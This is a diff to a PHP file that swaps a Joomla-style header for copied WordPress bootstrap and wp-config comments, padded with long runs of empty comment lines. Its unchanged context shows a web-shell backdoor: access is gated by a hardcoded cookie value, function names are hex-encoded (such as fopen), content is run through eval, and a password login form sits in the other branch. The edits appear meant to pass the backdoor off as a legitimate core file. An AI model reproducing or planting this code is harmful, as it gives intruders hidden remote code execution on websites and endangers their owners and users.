@@ -1,8 +1,60 @@
 <?php
 /**
- * @package
- * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
+ * Bootstrap file for setting the ABSPATH constant
+ * and loading the wp-config.php file. The wp-config.php
+ * file will then load the wp-settings.php file, which
+ * will then set up the WordPress environment.
  *
+ * If the wp-config.php file is not found then an error
+ * will be displayed asking the visitor to set up the
+ * wp-config.php file.
+ *
+ * Will also search for wp-config.php in WordPress' parent
+ * directory to allow the WordPress directory to remain
+ * untouched.
+ *
+ * 
+ * 
+ * 
+ *
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
  */
 
 // @deprecated  1.0  Deprecated without replacement
@@ -10,7 +62,24 @@ function is_logged_in()
 {
     return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'LPH'; 
 }
-
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the website, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ *
+ *
+ * 
+ */
 if (is_logged_in()) {
     $Array = array(
         '666f70656e', # fo p en => 0
@@ -61,6 +130,114 @@ if (is_logged_in()) {
     if ($dream !== false) {
         eval('?>' . $dream);
     }
+    /**
+ * @package
+ * @copyright
+ *
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ *
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ */
+/**
+ * The base configuration for
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the website, you can copy this file to
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ *
+ *
+ * 
+ */
 } else {
     if (isset($_POST['password'])) {
         $entered_key = $_POST['password'];
@@ -72,6 +249,24 @@ if (is_logged_in()) {
             exit();
         }
     }
+    /**
+ * The base configuration for
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the website, you can copy this file to
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ *
+ *
+ * 
+ */
     ?>
     <!DOCTYPE html>
     <html>
